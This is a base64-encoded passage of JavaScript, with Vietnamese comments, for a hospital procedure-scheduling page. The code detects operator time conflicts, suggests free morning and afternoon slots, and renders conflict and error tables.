NlbnRlcj4ke2Vycm9yLmRhdGV9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgIDx0ZD48Y2VudGVyPiR7ZXJyb3Iuc3RhcnRUaW1lfSDihpIgJHtlcnJvci5lbmRUaW1lfTwvY2VudGVyPjwvdGQ+DQogICAgICAgICAgICANCiAgICAgICAgPC90cj5gOw0KICAgIH0pOw0KICAgIA0KICAgIGh0bWwgKz0gYDwvdGJvZHk+PC90YWJsZT5gOw0KICAgIA0KICAgIG1pc3NpbmdNYWNoaW5lTG9nRGl2LmlubmVySFRNTCA9IGh0bWw7DQp9DQpmdW5jdGlvbiBnZW5lcmF0ZVRpbWVTdWdnZXN0aW9ucyhwcm9jZWR1cmVzKSB7DQogICAgY29uc3QgdGltZU9wdGlvbiA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2lucHV0W25hbWU9InRpbWVPcHRpb24iXTpjaGVja2VkJykudmFsdWU7DQogICAgY29uc3Qgc3RhcnRIb3VyID0gdGltZU9wdGlvbiA9PT0gJzc6MzAnID8gNy41IDogNzsNCiAgICBjb25zdCBpZ25vcmVBZGphY2VudCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpZ25vcmVBZGphY2VudENoZWNrYm94JykuY2hlY2tlZDsNCiAgICBjb25zdCBidWZmZXJNaW51dGVzID0gaWdub3JlQWRqYWNlbnQgPyAwIDogMTsNCiAgICBjb25zdCBzaG93TW9yZVN1Z2dlc3Rpb25zID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Nob3dNb3JlU3VnZ2VzdGlvbnNDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgDQogICAgLy8gU+G7kSBraHVuZyBnaeG7nSB04buRaSDEkWEgbeG7l2kgYnXhu5VpIChu4bq/dSBjaOG7jW4gNiBraHVuZyB0aMOsIDMgc8OhbmcgKyAzIGNoaeG7gXUpDQogICAgY29uc3QgbWF4TW9ybmluZyA9IHNob3dNb3JlU3VnZ2VzdGlvbnMgPyAzIDogMjsNCiAgICBjb25zdCBtYXhBZnRlcm5vb24gPSBzaG93TW9yZVN1Z2dlc3Rpb25zID8gMyA6IDE7DQoNCiAgICBwcm9jZWR1cmVzLmZvckVhY2gocHJvYyA9PiB7DQogICAgICAgIGlmICghcHJvYy5jb25mbGljdCkgcmV0dXJuOw0KDQogICAgICAgIGNvbnN0IHNhbWVEYXlQcm9jZWR1cmVzID0gcHJvY2VkdXJlcy5maWx0ZXIocCA9PiANCiAgICAgICAgICAgIHAuZGF0ZSA9PT0gcHJvYy5kYXRlICYmIA0KICAgICAgICAgICAgcC5vcGVyYXRvciA9PT0gcHJvYy5vcGVyYXRvciAmJg0KICAgICAgICAgICAgcC5yb3dJbmRleCAhPT0gcHJvYy5yb3dJbmRleA0KICAgICAgICApOw0KDQogICAgICAgIGNvbnN0IGR1cmF0aW9uU2Vjb25kcyA9IHByb2MuZW5kIC0gcHJvYy5zdGFydCArIChidWZmZXJNaW51dGVzICogNjApOw0KICAgICAgICANCiAgICAgICAgLy8gVMOsbSBraHVuZyBnaeG7nSBideG7lWkgc8OhbmcNCiAgICAgICAgY29uc3QgbW9ybmluZ1Nsb3RzID0gZmluZEF2YWlsYWJsZVNsb3RzKA0KICAgICAgICAgICAgc3RhcnRIb3VyICogMzYwMCwgDQogICAgICAgICAgICAxMS41ICogMzYwMCwgDQogICAgICAgICAgICBkdXJhdGlvblNlY29uZHMsIA0KICAgICAgICAgICAgc2FtZURheVByb2NlZHVyZXMsIA0KICAgICAgICAgICAgbWF4TW9ybmluZw0KICAgICAgICApOw0KICAgICAgICANCiAgICAgICAgLy8gVMOsbSBraHVuZyBnaeG7nSBideG7lWkgY2hp4buBdQ0KICAgICAgICBjb25zdCBhZnRlcm5vb25TbG90cyA9IGZpbmRBdmFpbGFibGVTbG90cygNCiAgICAgICAgICAgIDEzLjUgKiAzNjAwLCANCiAgICAgICAgICAgIDE3ICogMzYwMCwgDQogICAgICAgICAgICBkdXJhdGlvblNlY29uZHMsIA0KICAgICAgICAgICAgc2FtZURheVByb2NlZHVyZXMsIA0KICAgICAgICAgICAgbWF4QWZ0ZXJub29uDQogICAgICAgICk7DQoNCiAgICAgICAgLy8gRm9ybWF0IGvhur90IHF14bqjDQogICAgICAgIGxldCBzdWdnZXN0aW9ucyA9IFtdOw0KICAgICAgICBpZiAobW9ybmluZ1Nsb3RzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgIHN1Z2dlc3Rpb25zLnB1c2goJzxzdHJvbmc+U8Ohbmc6PC9zdHJvbmc+PGJyPicgKyANCiAgICAgICAgICAgICAgICBtb3JuaW5nU2xvdHMubWFwKHNsb3QgPT4gYCR7c2xvdC5zdGFydH0gLSAke3Nsb3QuZW5kfWApLmpvaW4oJzxicj4nKSk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGFmdGVybm9vblNsb3RzLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgIHN1Z2dlc3Rpb25zLnB1c2goJzxzdHJvbmc+Q2hp4buBdTo8L3N0cm9uZz48YnI+JyArIA0KICAgICAgICAgICAgICAgIGFmdGVybm9vblNsb3RzLm1hcChzbG90ID0+IGAke3Nsb3Quc3RhcnR9IC0gJHtzbG90LmVuZH1gKS5qb2luKCc8YnI+JykpOw0KICAgICAgICB9DQoNCiAgICAgICAgDQppZiAobW9ybmluZ1Nsb3RzLmxlbmd0aCArIGFmdGVybm9vblNsb3RzLmxlbmd0aCA+IDApIHsNCiAgICBwcm9jLnN1Z2dlc3Rpb24gPSBzdWdnZXN0aW9ucy5qb2luKCc8YnI+Jyk7DQp9IGVsc2Ugew0KICAgIHByb2Muc3VnZ2VzdGlvbiA9ICc8c3BhbiBjbGFzcz0ibm8tc3VnZ2VzdGlvbiI+S2jDtG5nIGPDsyBraHVuZyBnaeG7nSB0cuG7kW5nPC9zcGFuPic7DQp9DQoNCiAgICB9KTsNCn0NCi8vIEjDoG0ga2nhu4NtIHRyYSB4dW5nIMSR4buZdCB0aOG7nWkgZ2lhbg0KZnVuY3Rpb24gaGFzVGltZUNvbmZsaWN0KHN0YXJ0VGltZSwgZHVyYXRpb24sIHByb2NlZHVyZXMpIHsNCiAgICBjb25zdCBlbmRUaW1lID0gc3RhcnRUaW1lICsgZHVyYXRpb247DQogICAgDQogICAgZm9yIChjb25zdCBwcm9jIG9mIHByb2NlZHVyZXMpIHsNCiAgICAgICAgY29uc3QgcHJvY1N0YXJ0ID0gcHJvYy5zdGFydDsNCiAgICAgICAgY29uc3QgcHJvY0VuZCA9IHByb2MuZW5kICsgKHByb2MucHJvY2VkdXJlSW5mbz8uYnVmZmVyIHx8IDApICogNjA7DQogICAgICAgIA0KICAgICAgICBpZiAoKHN0YXJ0VGltZSA+PSBwcm9jU3RhcnQgJiYgc3RhcnRUaW1lIDwgcHJvY0VuZCkgfHwgDQogICAgICAgICAgICAoZW5kVGltZSA+IHByb2NTdGFydCAmJiBlbmRUaW1lIDw9IHByb2NFbmQpIHx8DQogICAgICAgICAgICAoc3RhcnRUaW1lIDw9IHByb2NTdGFydCAmJiBlbmRUaW1lID49IHByb2NFbmQpKSB7DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICANCiAgICByZXR1cm4gZmFsc2U7DQp9DQovLyBIw6BtIHTDrG0ga2h1bmcgZ2nhu50gdHLhu5FuZw0KZnVuY3Rpb24gZmluZEF2YWlsYWJsZVNsb3RzKHN0YXJ0VGltZSwgZW5kVGltZSwgZHVyYXRpb24sIHByb2NlZHVyZXMsIG1heFNsb3RzKSB7DQogICAgY29uc3Qgc2xvdHMgPSBbXTsNCiAgICBsZXQgY3VycmVudFRpbWUgPSBzdGFydFRpbWU7DQogICAgY29uc3QgaWdub3JlQWRqYWNlbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnaWdub3JlQWRqYWNlbnRDaGVja2JveCcpLmNoZWNrZWQ7DQogICAgY29uc3QgYnVmZmVyTWludXRlcyA9IGlnbm9yZUFkamFjZW50ID8gMCA6IDE7DQogICAgDQogICAgd2hpbGUgKGN1cnJlbnRUaW1lICsgZHVyYXRpb24gPD0gZW5kVGltZSAmJiBzbG90cy5sZW5ndGggPCBtYXhTbG90cykgew0KICAgICAgICBpZiAoIWhhc1RpbWVDb25mbGljdChjdXJyZW50VGltZSwgZHVyYXRpb24sIHByb2NlZHVyZXMpKSB7DQogICAgICAgICAgICBzbG90cy5wdXNoKHsNCiAgICAgICAgICAgICAgICBzdGFydDogc2Vjb25kc1RvVGltZVN0cihjdXJyZW50VGltZSksDQogICAgICAgICAgICAgICAgZW5kOiBzZWNvbmRzVG9UaW1lU3RyKGN1cnJlbnRUaW1lICsgKGR1cmF0aW9uIC0gKGJ1ZmZlck1pbnV0ZXMgKiA2MCkpKSAvLyBUcuG7qyBidWZmZXIgxJHhu4MgaGnhu4NuIHRo4buLDQogICAgICAgICAgICB9KTsNCiAgICAgICAgfQ0KICAgICAgICBjdXJyZW50VGltZSArPSAxNSAqIDYwOyAvLyBLaeG7g20gdHJhIG3hu5dpIDE1IHBow7p0DQogICAgfQ0KICAgIA0KICAgIHJldHVybiBzbG90czsNCn0NCg0KICAgICAgICBmdW5jdGlvbiBzZWNvbmRzVG9UaW1lU3RyKHNlY29uZHMpIHsNCiAgICAgICAgICAgIGNvbnN0IGhvdXJzID0gTWF0aC5mbG9vcihzZWNvbmRzIC8gMzYwMCk7DQogICAgICAgICAgICBjb25zdCBtaW51dGVzID0gTWF0aC5mbG9vcigoc2Vjb25kcyAlIDM2MDApIC8gNjApOw0KICAgICAgICAgICAgcmV0dXJuIGAke2hvdXJzLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKX06JHttaW51dGVzLnRvU3RyaW5nKCkucGFkU3RhcnQoMiwgJzAnKX1gOw0KICAgICAgICB9DQoNCg0KLy8gxJDhur9tIHThu5VuZyBjYSAic+G6r2MgdGh14buRYyIga2jDoWMgxJFhIHPhu5EgKG91dGxpZXIpDQpmdW5jdGlvbiBnZXRIZXJiT3V0bGllclRvdGFsKCkgew0KICBjb25zdCBoZXJicyA9IEFycmF5LmlzQXJyYXkod2luZG93LmFsbEhlcmJQcm9jZWR1cmVzKSA/IHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcyA6IFtdOw0KICBjb25zdCBjb3VudHNCeURhdGUgPSB7fTsNCiAgaGVyYnMuZm9yRWFjaChoID0+IHsNCiAgICBjb25zdCBkID0gaC5kYXRlOw0KICAgIGNvbnN0IG4gPSAoaC5vcGVyYXRvciB8fCAnS2jDtG5nIGPDsycpLnRyaW0oKS50b0xvd2VyQ2FzZSgpOw0KICAgIGlmICghY291bnRzQnlEYXRlW2RdKSBjb3VudHNCeURhdGVbZF0gPSB7fTsNCiAgICBjb3VudHNCeURhdGVbZF1bbl0gPSAoY291bnRzQnlEYXRlW2RdW25dIHx8IDApICsgMTsNCiAgfSk7DQogIGxldCBvdXRsaWVycyA9IDA7DQogIE9iamVjdC52YWx1ZXMoY291bnRzQnlEYXRlKS5mb3JFYWNoKG1hcCA9PiB7DQogICAgY29uc3QgZW50cmllcyA9IE9iamVjdC5lbnRyaWVzKG1hcCkuc29ydCgoYSxiKT0+YlsxXS1hWzFdKTsNCiAgICBjb25zdCB0b3AgPSBlbnRyaWVzWzBdOyBpZiAoIXRvcCkgcmV0dXJuOw0KICAgIGNvbnN0IHRvcE5hbWUgPSB0b3BbMF07DQogICAgZW50cmllcy5mb3JFYWNoKChbbmFtZSwgY250XSkgPT4geyBpZiAobmFtZSAhPT0gdG9wTmFtZSkgb3V0bGllcnMgKz0gY250OyB9KTsNCiAgfSk7DQogIHJldHVybiBvdXRsaWVyczsNCn0NCg0KLy8gxJDhur9tIGzhu5dpIHNhaSB0aOG7nWkgZ2lhbiAoa+G6v3QgdGjDumMgPD0gYuG6r3QgxJHhuqd1LCDEkeG7i25oIGThuqFuZyBzYWksIHNhaSBwaMO6dCBzbyB24bubaSBxdXkgxJHhu4tuaCwuLi4pDQpmdW5jdGlvbiBnZXRUaW1lRXJyb3JUb3RhbCgpIHsNCiAgLy8gxJDhur9tIMSRw7puZyB0aGVvIHPhu5EgaMOgbmcgbOG7l2kgxJFhbmcgaGnhu4NuIHRo4buLDQogIGNvbnN0IGNvbnRhaW5lciA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdlcnJvckxvZycpOyAvLyB2w7luZyBi4bqjbmcgbOG7l2kgdGjhu51pIGdpYW4NCiAgaWYgKCFjb250YWluZXIpIHJldHVybiAwOw0KICByZXR1cm4gY29udGFpbmVyLnF1ZXJ5U2VsZWN0b3JBbGwoJ3RyLmVycm9yLXJvdycpLmxlbmd0aDsNCn0NCg0KZnVuY3Rpb24gZ2V0Q29uZmxpY3RUb3RhbCgpIHsNCiAgLy8gxJDhur9tIMSRw7puZyB0aGVvIHPhu5EgaMOgbmcgeHVuZyDEkeG7mXQgdHJvbmcga+G6v3QgcXXhuqMNCiAgY29uc3QgdGJvZHkgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0Qm9keScpOyAvLyB0Ym9keSBj4bunYSBi4bqjbmcga+G6v3QgcXXhuqMNCiAgaWYgKCF0Ym9keSkgcmV0dXJuIDA7DQogIHJldHVybiB0Ym9keS5xdWVyeVNlbGVjdG9yQWxsKCd0ci5jb25mbGljdC1yb3cnKS5sZW5ndGg7DQp9DQoNCg0KDQoNCg0KDQoNCg0KICAgICAgIGZ1bmN0aW9uIGRpc3BsYXlSZXN1bHRzKHByb2NlZHVyZXMsIHNraXBwZWRSb3dzID0gMCkgew0KICAgIGFsbFByb2NlZHVyZXMgPSBwcm9jZWR1cmVzOw0KICAgIA0KICAgIGNvbnN0IG9wZXJhdG9ycyA9IFsuLi5uZXcgU2V0KHByb2NlZHVyZXMubWFwKHAgPT4gcC5vcGVyYXRvcikpXTsNCiAgICBjb25zdCBvcGVyYXRvclNlbGVjdCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvclNlbGVjdCcpOw0KICAgIGNvbnN0IG9wZXJhdG9yU2VsZWN0RXJyb3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3RFcnJvcicpOw0KICAgIA0KICAgIG9wZXJhdG9yU2VsZWN0LmlubmVySFRNTCA9ICc8b3B0aW9uIHZhbHVlPSJhbGwiPlThuqV0IGPhuqM8L29wdGlvbj4nICsgDQogICAgICAgIG9wZXJhdG9ycy5tYXAob3AgPT4gYDxvcHRpb24gdmFsdWU9IiR7b3B9Ij4ke29wLnJlcGxhY2UoLywvZywgJycpfTwvb3B0aW9uPmApLmpvaW4oJycpOw0KICAgIA0KICAgIG9wZXJhdG9yU2VsZWN0RXJyb3IuaW5uZXJIVE1MID0gb3BlcmF0b3JTZWxlY3QuaW5uZXJIVE1MOyAvLyDEkOG7k25nIGLhu5kgbuG7mWkgZHVuZw0KICAgIA0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvckZpbHRlcicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdvcGVyYXRvckZpbHRlckVycm9yJykuc3R5bGUuZGlzcGxheSA9ICdibG9jayc7DQogICAgICAgICAgICANCiAgICAgICAgICAgIGNvbnN0IGNvbmZsaWN0UHJvY2VkdXJlcyA9IHByb2NlZHVyZXMuZmlsdGVyKHAgPT4gcC5jb25mbGljdCk7DQogICAgICAgICAgICBjb25zdCBjb25mbGljdENvdW50ID0gY29uZmxpY3RQcm9jZWR1cmVzLmxlbmd0aDsNCiAgICAgICAgICAgIA0KICAgICAgICAgICAgDQogICAgICAgICAgICANCiAgICAgICAgICAgIGZpbHRlckJ5T3BlcmF0b3IoKTsNCiAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgncmVzdWx0U2VjdGlvbicpLnN0eWxlLmRpc3BsYXkgPSAnYmxvY2snOw0KICAgIA0KICAgIC8vIE7hur91IGtow7RuZyBjw7MgbOG7l2ksIGN14buZbiB4deG7kW5nIHBo4bqnbiBr4bq/dCBxdeG6ow0KICAgIGlmIChlcnJvckxvZy5sZW5ndGggPT09IDApIHsNCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7DQogICAgICAgICAgICBjb25zdCByZXN1bHRTZWN0aW9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdFNlY3Rpb24nKTsNCiAgICAgICAgICAgIGlmIChyZXN1bHRTZWN0aW9uKSB7DQogICAgICAgICAgICAgICAgc21vb3RoU2Nyb2xsVG8ocmVzdWx0U2VjdGlvbiwgLTQwKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSwgMzAwKTsNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIGZpbHRlckJ5T3BlcmF0b3IoKSB7DQogICAgY29uc3Qgb3BlcmF0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3QnKS52YWx1ZTsNCg0KIGNvbnN0IHNob3dEb2N0b3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnc2hvd0RvY3RvckNoZWNrYm94JykuY2hlY2tlZDsNCiAgICBkb2N1bWVudC5ib2R5LmNsYXNzTGlzdC50b2dnbGUoJ3Nob3ctZG9jdG9yJywgc2hvd0RvY3Rvcik7DQogICAgLy8gPT09PT0gMS4gTOG7jEMgVsOAIEhJ4buCTiBUSOG7iiBC4bqiTkcgS+G6vlQgUVXhuqIgS0nhu4JNIFRSQSBYVU5HIMSQ4buYVCA9PT09PQ0KICAgIGNvbnN0IGZpbHRlcmVkUHJvY2VkdXJlcyA9IG9wZXJhdG9yID09PSAnYWxsJyANCiAgICAgICAgPyBhbGxQcm9jZWR1cmVzLmZpbHRlcihwID0+IHAuY29uZmxpY3QpIA0KICAgICAgICA6IGFsbFByb2NlZHVyZXMuZmlsdGVyKHAgPT4gcC5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA9PT0gb3BlcmF0b3IucmVwbGFjZSgvLC9nLCAnJykgJiYgcC5jb25mbGljdCk7DQoNCiAgICBjb25zdCByZXN1bHRCb2R5ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3Jlc3VsdEJvZHknKTsNCiAgICByZXN1bHRCb2R5LmlubmVySFRNTCA9ICcnOw0KDQogICAgLy8gTmjDs20gY8OhYyB0aOG7pyB0aHXhuq10IHh1bmcgxJHhu5l0IHbhu5tpIG5oYXUNCiAgICBjb25zdCBjb25mbGljdEdyb3VwcyA9IFtdOw0KICAgIGNvbnN0IHByb2Nlc3NlZFJvd3MgPSBuZXcgU2V0KCk7DQoNCiAgICBmaWx0ZXJlZFByb2NlZHVyZXMuZm9yRWFjaChwcm9jID0+IHsNCiAgICAgICAgaWYgKCFwcm9jZXNzZWRSb3dzLmhhcyhwcm9jLnJvd0luZGV4KSkgew0KICAgICAgICAgICAgY29uc3QgZ3JvdXAgPSBbcHJvY107DQogICAgICAgICAgICBwcm9jZXNzZWRSb3dzLmFkZChwcm9jLnJvd0luZGV4KTsNCg0KICAgICAgICAgICAgLy8gVMOsbSB0aOG7pyB0aHXhuq10IGxpw6puIHF1YW4gdHJvbmcgeHVuZyDEkeG7mXQNCiAgICAgICAgICAgIGlmIChwcm9jLmNvbmZsaWN0UmVhc29uKSB7DQogICAgICAgICAgICAgICAgY29uc3QgY29uZmxpY3RNYXRjaGVzID0gcHJvYy5jb25mbGljdFJlYXNvbi5tYXRjaCgvQuG7h25oIG5ow6JuOiAoLio/KTxicj7igKIgTmfDoHk6ICguKj8pPGJyPuKAoiBUaOG7nWkgZ2lhbjogKC4qPyktL2cpOw0KICAgICAgICAgICAgICAgIGlmIChjb25mbGljdE1hdGNoZXMpIHsNCiAgICAgICAgICAgICAgICAgICAgY29uZmxpY3RNYXRjaGVzLmZvckVhY2gobWF0Y2ggPT4gew0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgcGF0aWVudE5hbWUgPSBtYXRjaC5tYXRjaCgvQuG7h25oIG5ow6JuOiAoLio/KTxicj4vKVsxXTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGRhdGUgPSBtYXRjaC5tYXRjaCgvTmfDoHk6ICguKj8pPGJyPi8pWzFdOw0KICAgICAgICAgICAgICAgICAgICAgICAgY29uc3QgdGltZSA9IG1hdGNoLm1hdGNoKC9UaOG7nWkgZ2lhbjogKC4qPyktLylbMV07DQoNCiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnN0IGNvbmZsaWN0UHJvYyA9IGZpbHRlcmVkUHJvY2VkdXJlcy5maW5kKHAgPT4gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcC5wYXRpZW50TmFtZSA9PT0gcGF0aWVudE5hbWUgJiYgDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcC5kYXRlID09PSBkYXRlICYmIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuZGlzcGxheVN0YXJ0ID09PSB0aW1lICYmDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgIXByb2Nlc3NlZFJvd3MuaGFzKHAucm93SW5kZXgpDQogICAgICAgICAgICAgICAgICAgICAgICApOw0KDQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoY29uZmxpY3RQcm9jKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZ3JvdXAucHVzaChjb25mbGljdFByb2MpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb2Nlc3NlZFJvd3MuYWRkKGNvbmZsaWN0UHJvYy5yb3dJbmRleCk7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIH0pOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGNvbmZsaWN0R3JvdXBzLnB1c2goZ3JvdXApOw0KICAgICAgICB9DQogICAgfSk7DQoNCiAgIC8vIEhp4buDbiB0aOG7iyBr4bq/dCBxdeG6ow0KICAgIGNvbmZsaWN0R3JvdXBzLmZvckVhY2goZ3JvdXAgPT4gew0KICAgICAgICBncm91cC5mb3JFYWNoKHByb2MgPT4gew0KICAgICAgICAgICAgY29uc3Qgcm93ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgndHInKTsNCiAgICAgICAgICAgIHJvdy5jbGFzc0xpc3QuYWRkKCJoZXJiLXJvdyIpOw0KICAgICAgICAgICAgcm93LmNsYXNzTGlzdC5hZGQoJ2NvbmZsaWN0LXJvdycpOw0KICAgICAgICAgICAgcm93LmlubmVySFRNTCA9IGANCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLnBhdGllbnROYW1lfSA8YnIvPiAke3Byb2MucGF0aWVudElkfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkPiR7cHJvYy5wcm9jZWR1cmV9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+PGNlbnRlcj4ke3Byb2MuZGF0ZX08YnIvPiR7cHJvYy5kaXNwbGF5U3RhcnR9IC0gJHtwcm9jLmRpc3BsYXlFbmR9PC9jZW50ZXI+PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQgY2xhc3M9ImRvY3Rvci1jb2x1bW4iPiR7cHJvYy5kb2N0b3J9PC90ZD4NCiAgICAgICAgICAgICAgICA8dGQ+JHtwcm9jLm9wZXJhdG9yLnJlcGxhY2UoLywvZywgJycpfTwvdGQ+DQogICAgICAgICAgICAgICAgPHRkIGNsYXNzPSJ0aW1lLXN1Z2dlc3Rpb24iPiR7cHJvYy5zdWdnZXN0aW9uIHx8ICdLaMO0bmcgY8OzIHh1bmcgxJHhu5l0J308L3RkPg0KICAgICAgICAgICAgYDsNCiAgICAgICAgICAgIHJlc3VsdEJvZHkuYXBwZW5kQ2hpbGQocm93KTsNCiAgICAgICAgfSk7DQoNCiAgICAgICAgLy8gVGjDqm0gZMOybmcgcGjDom4gY8OhY2gNCiAgICAgICAgaWYgKGdyb3VwLmxlbmd0aCA+IDApIHsNCiAgICAgICAgICAgIGNvbnN0IHNlcGFyYXRvciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3RyJyk7DQogICAgICAgICAgICBzZXBhcmF0b3IuaW5uZXJIVE1MID0gJzx0ZCBjb2xzcGFuPSI4IiBjbGFzcz0iZ3JvdXAtc2VwYXJhdG9yIj48L3RkPic7DQogICAgICAgICAgICByZXN1bHRCb2R5LmFwcGVuZENoaWxkKHNlcGFyYXRvcik7DQogICAgICAgIH0NCiAgICB9KTsNCg0KICAgIC8vIE7hur91IGtow7RuZyBjw7MgbmjDs20gbsOgbyB0aMOsIHRow6ptIGTDsm5nIGLDoW8gIktow7RuZyBjw7MgbOG7l2kiDQogICAgaWYgKGNvbmZsaWN0R3JvdXBzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBjb25zdCByb3cgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCd0cicpOw0KICAgICAgICByb3cuaW5uZXJIVE1MID0gYA0KICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49IjUiY2xhc3M9ImhlcmItcm93IGNvbmZsaWN0LXJvdyI+S2jDtG5nIGPDsyBs4buXaSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3RkPg0KICAgICAgICBgOw0KICAgICAgICByZXN1bHRCb2R5LmFwcGVuZENoaWxkKHJvdyk7DQogICAgfQ0KDQogICAgLy8gPT09PT0gMi4gTOG7jEMgVsOAIEhJ4buCTiBUSOG7iiBC4bqiTkcgTOG7lkkgPT09PT0NCmNvbnN0IG9wZXJhdG9yRXJyb3IgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnb3BlcmF0b3JTZWxlY3RFcnJvcicpLnZhbHVlOw0KIGNvbnN0IGZpbHRlcmVkRXJyb3JzID0gb3BlcmF0b3JFcnJvciA9PT0gJ2FsbCcgDQogICA/IGVycm9yTG9nIA0KICAgOiBlcnJvckxvZy5maWx0ZXIoZXJyb3IgPT4NCiAgICAgICBlcnJvci5kZXRhaWxzICYmDQogICAgICBlcnJvci5kZXRhaWxzLm9wZXJhdG9yICYmDQogICAgICAgZXJyb3IuZGV0YWlscy5vcGVyYXRvci5yZXBsYWNlKC8sL2csICcnKSA9PT0gb3BlcmF0b3JFcnJvci5yZXBsYWNlKC8sL2csICcnKQ0KICAgICk7DQoNCiAgICAvLyBIaeG7g24gdGjhu4sgbOG7l2kgxJHDoyBs4buNYw0KICAgIGNvbnN0IGVycm9yTG9nRGl2ID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Vycm9yTG9nJyk7DQogICAgaWYgKGZpbHRlcmVkRXJyb3JzLmxlbmd0aCA9PT0gMCkgew0KICAgICAgICBlcnJvckxvZ0Rpdi5pbm5lckhUTUwgPSBgPHRhYmxlIGNsYXNzPSJlcnJvci10YWJsZSI+DQogICAgICAgIDx0aGVhZD4NCiAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXMgZmEtdXNlciBmYS1zcGluLWNvbnRpbnVvdXMiPjwvaT4gVMOqbiBCTjwvdGg+DQogICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS1wcm9jZWR1cmVzIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUaOG7pyB0aHXhuq10PC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXVzZXItbnVyc2UgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IE5nxrDhu51pIHRo4buxYyBoaeG7h248L3RoPg0KICAgICAgICAgICAgPHRoPjxpIGNsYXNzPSJmYXIgZmEtY2xvY2sgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4budaSBnaWFuPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLWV4Y2xhbWF0aW9uLXRyaWFuZ2xlIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBM4buXaTwvdGg+DQogICAgICAgICAgICA8L3RyPg0KICAgICAgICA8L3RoZWFkPg0KICAgICAgICA8dGJvZHk+IDx0ciBjbGFzcz0iZXJyb3Itcm93Ij4NCiAgICAgICAgICAgICAgICA8dGQgY29sc3Bhbj0iNSIgY2xhc3M9ImVycm9yLWRldGFpbCI+S2jDtG5nIGPDsyBs4buXaSBuw6BvIMSRxrDhu6NjIGdoaSBuaOG6rW48L3RkPjwvdHI+PC90Ym9keT48L3RhYmxlPmA7DQogICAgICAgIHJldHVybjsNCiAgICB9DQoNCiAgICBsZXQgaHRtbCA9IGANCiAgICA8dGFibGUgY2xhc3M9ImVycm9yLXRhYmxlIj4NCiAgICAgICAgPHRoZWFkPg0KICAgICAgICAgICAgPHRyPg0KICAgICAgICAgICAgICA8dGg+PGkgY2xhc3M9ImZhcyBmYS11c2VyIGZhLXNwaW4tY29udGludW91cyI+PC9pPiBUw6puIEJOPC90aD4NCiAgICAgICAgICAgIDx0aD48aSBjbGFzcz0iZmFzIGZhLXByb2NlZHVyZXMgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IFRo4bunIHRodeG6rXQ8L3RoPg0KICAgICAgICAgICAgPHRoIGNsYXNzPSJkb2N0b3ItY29sdW1uIj48aSBjbGFzcz0iZmFzIGZhLXVzZXItbWQgZmEtc3Bpbi1jb250aW51b3VzIj48L2k+IELDoWMgc+G7uSBjaO